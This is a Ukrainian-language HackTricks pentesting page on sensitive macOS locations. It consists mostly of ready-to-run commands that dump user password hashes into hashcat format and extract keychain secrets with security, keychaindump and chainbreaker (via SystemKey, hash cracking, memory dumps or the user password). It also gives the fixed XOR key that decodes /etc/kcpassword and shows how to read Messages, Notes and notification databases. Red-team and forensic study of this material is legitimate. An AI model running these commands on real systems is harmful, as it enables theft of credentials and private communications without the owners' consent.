# Чутливі місця macOS

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію в рекламі HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **і** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв на GitHub.**

</details>

## Паролі

### Тіньові паролі

Тіньовий пароль зберігається разом із конфігурацією користувача в plist-файлах, розташованих в **`/var/db/dslocal/nodes/Default/users/`**.\
Наступний одностроковий вираз може бути використаний для виведення **всієї інформації про користувачів** (включаючи інформацію про хеш):
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
{% endcode %}

[**Сценарії, подібні до цього**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) або [**цей**](https://github.com/octomagon/davegrohl.git) можуть бути використані для перетворення хешу в **формат hashcat**.

Альтернативний однорядковий інструмент, який виведе дані облікових записів всіх несервісних облікових записів у форматі hashcat `-m 7100` (macOS PBKDF2-SHA512):

{% code overflow="wrap" %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
{% endcode %}

### Витік ключів

Зверніть увагу, що при використанні бінарного файлу security для **витягування розшифрованих паролів**, користувачеві буде запропоновано декілька запитів на дозвіл цієї операції.
```bash
#security
secuirty dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
За цим коментарем [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) здається, що ці інструменти більше не працюють в Big Sur.
{% endhint %}

### Огляд Keychaindump

Інструмент з назвою **keychaindump** був розроблений для вилучення паролів з ключниць macOS, але він має обмеження на новіших версіях macOS, таких як Big Sur, як вказано в [обговоренні](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Використання **keychaindump** вимагає від зловмисника отримання доступу та підвищення привілеїв до **root**. Інструмент використовує той факт, що ключниця за замовчуванням розблоковується при вході користувача для зручності, що дозволяє програмам отримувати до неї доступ без необхідності повторного введення пароля користувача. Однак, якщо користувач вирішить блокувати свою ключницю після кожного використання, **keychaindump** стає неефективним.

**Keychaindump** працює, спрямовуючи на конкретний процес під назвою **securityd**, описаний Apple як демон для авторизації та криптографічних операцій, який є важливим для доступу до ключниці. Процес вилучення включає виявлення **Master Key**, похідного від пароля входу користувача. Цей ключ є важливим для читання файлу ключниці. Для знаходження **Master Key**, **keychaindump** сканує кучу пам'яті **securityd**, використовуючи команду `vmmap`, шукаючи потенційні ключі в областях, позначених як `MALLOC_TINY`. Для перевірки цих місць пам'яті використовується наступна команда:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Після ідентифікації потенційних головних ключів, **keychaindump** шукає через купи певний шаблон (`0x0000000000000018`), що вказує на кандидата на головний ключ. Для використання цього ключа потрібні додаткові кроки, включаючи деобфускацію, як описано в вихідному коді **keychaindump**. Аналітики, які зосереджуються на цій області, повинні зауважити, що важливі дані для розшифрування keychain зберігаються в пам'яті процесу **securityd**. Приклад команди для запуску **keychaindump**:
```bash
sudo ./keychaindump
```
### руйнівник ланцюга

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) можна використовувати для вилучення наступних типів інформації з ключового ланцюга OSX у форензично обґрунтований спосіб:

* Хешований пароль ключового ланцюга, придатний для взлому за допомогою [hashcat](https://hashcat.net/hashcat/) або [John the Ripper](https://www.openwall.com/john/)
* Інтернет-паролі
* Загальні паролі
* Приватні ключі
* Публічні ключі
* X509-сертифікати
* Безпечні нотатки
* Паролі Appleshare

За наявності пароля розблокування ключового ланцюга, майстер-ключа, отриманого за допомогою [volafox](https://github.com/n0fate/volafox) або [volatility](https://github.com/volatilityfoundation/volatility), або файлу розблокування, такого як SystemKey, Chainbreaker також надасть текстові паролі.

Без одного з цих методів розблокування ключового ланцюга Chainbreaker відобразить всю іншу доступну інформацію.

#### **Вивантаження ключів ключового ланцюга**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Витягнути ключі з keychain (з паролями) за допомогою SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Витягнення ключів keychain (з паролями) шляхом зламування хешу**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Витягнення ключів keychain (з паролями) за допомогою дампу пам'яті**

[Виконайте ці кроки](..#dumping-memory-with-osxpmem), щоб виконати **дамп пам'яті**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Витягнення ключів з keychain (з паролями) за допомогою пароля користувача**

Якщо ви знаєте пароль користувача, ви можете використати його для **витягнення та розшифрування keychain, які належать користувачеві**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

Файл **kcpassword** - це файл, який містить **пароль для входу користувача**, але лише у випадку, якщо власник системи **увімкнув автоматичний вхід**. Тому користувач буде автоматично увійти без запиту пароля (що не є дуже безпечним).

Пароль зберігається в файлі **`/etc/kcpassword`**, зашифрований з ключем **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Якщо пароль користувача довший за ключ, ключ буде повторно використаний.\
Це робить пароль досить легким для відновлення, наприклад, за допомогою скриптів, подібних до [**цього**](https://gist.github.com/opshope/32f65875d45215c3677d). 

## Цікава інформація в базах даних

### Повідомлення
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Сповіщення

Ви можете знайти дані про сповіщення в `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`

Більшість цікавої інформації буде в **blob**. Тому вам потрібно **видобути** цей вміст і **перетворити** його в **людино-читабельний** формат або використовувати **`strings`**. Для доступу до нього ви можете виконати:

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
### Примітки

Примітки користувачів можна знайти в `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`

{% endcode %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
{% endcode %}

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити **рекламу вашої компанії на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **і** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв на GitHub**.

</details>
